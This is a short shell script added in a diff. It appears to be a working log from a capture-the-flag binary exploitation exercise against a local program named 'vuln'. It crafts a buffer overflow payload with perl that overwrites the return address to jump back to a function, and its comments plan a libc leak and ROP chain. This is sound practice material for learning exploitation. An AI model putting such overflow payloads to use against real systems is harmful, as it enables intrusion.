@@ -1,0 +1,18 @@
+#!/bin/sh
+
+## this will be harder
+## we need a leak from libc or the plt, or GOT or somewhere we can rop to
+## from the easy, it seems like the .text section addresses are constant
+## this means we sould be able to get leak an address on the printf then ret to the read
+cp ../easy/pattern .
+cp ../easy/profile.rr2 .
+cat pattern | strace ./vuln  # "--- SIGBUS {si_signo=SIGBUS, si_code=SI_KERNEL, si_addr=NULL} ---"
+
+## lets send it to the begining of the function (0x401136)
+perl -e 'print "\x90"x120 . "\x36\x11\x40\x00\x00\x00\x00\x00" ' | strace ./vuln  #  "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=NULL} ---"
+perl -e 'print "\x90"x120 . "\x36\x11\x40\x00\x00\x00\x00\x00" ' > pattern
+# r2 -A -r profile.rr2 -d vuln
+
+## radare shows this as working
+
+
